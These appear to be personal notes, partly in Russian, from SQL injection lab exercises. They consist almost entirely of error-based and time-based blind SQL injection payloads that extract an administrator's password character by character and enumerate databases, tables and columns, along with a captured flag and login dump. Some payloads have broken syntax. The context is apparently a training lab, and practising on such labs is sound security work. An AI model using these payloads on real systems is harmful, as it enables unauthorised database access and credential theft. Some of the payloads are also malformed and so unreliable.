
second laba:
'||(SELECT CASE WHEN SUBSTR(password,1,1)>'a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- .

third laba:
'||(SELECT CASE WHEN SUBSTRING(password,1,1)>'a' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator') -- .
'||(CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END) -- .



Today task Ramazana

1)
1'||(SELECT+CASE+WHEN+SUBSTRING(password,{n_sim_of_pass},1){operator}'{simbol}'+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users+WHERE+username='administrator')+--+.

2)
1'+AND+(SELECT+SLEEP(2)+FROM+dual+WHERE+tables()+LIKE+"%f%")+--+.
3)
1'+AND+(SELECT+IF+SUBSTRING((SELECT+table_name+FROM+information_schema.tables),+1,+1)='f',+SLEEP(2),+'a')+--+.

<pre>ID:1<br />Логин: admin<br />
Пароль: netu</pre><pre>ID:312424<br />
Логин: flag<br />Пароль: flag{14fff00895822c08013d750a41c8f024}</pre>

4)
1'+AND+(SELECT+IF+(SUBSTRING(SELECT table_name FROM information_schema.tables where table_schema='ramaza12_sql5',1,1)='U'),SLEEP(2),'a')+--+.


5)
1 AND (SELECT sleep(10) FROM dual WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=database() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%') -- .
1'+AND+(SELECT+sleep(10)+FROM+dual+WHERE+(SELECT+table_name+FROM+information_schema.columns+WHERE+table_schema=database()+AND+column_name+LIKE+'%pass%'+LIMIT+0,1)+LIKE+'%')+--+.

''

6)



Полезная нагрузка, чтобы узнать название базы данных:
1' +AND+(SELECT+IF(SUBSTRING((SELECT+database()),1,1)='r',SLEEP(2),SLEEP(0)))+--+.

Полезная нагрузка, чтобы узнать сколько в данной БД таблиц:
1' +AND+(SELECT SLEEP(5) FROM information_schema.tables WHERE TABLE_SCHEMA = "ramaza12_sqltas2" LIMIT 8,1)+--+.

1'+AND+(SELECT+COLUMN_NAME+FROM+information_schema.columns+WHERE+table_name+=+'users'+LIMIT+0,1)+--+.


Полезная нагрузка, чтобы узнать названия таблиц:
1' AND (SELECT IF(SUBSTRING((SELECT TABLE_NAME FROM information_schema.columns WHERE TABLE_SCHEMA = database() LIMIT 0,1), 1, 1)='c', SLEEP(2), SLEEP(0)))+--+.
1'+AND+(SELECT+IF(SUBSTRING((SELECT+TABLE_NAME+FROM+information_schema.columns+WHERE+TABLE_SCHEMA+=+database()+LIMIT+0,1),1,1)='c',SLEEP(2),SLEEP(0)))+--+.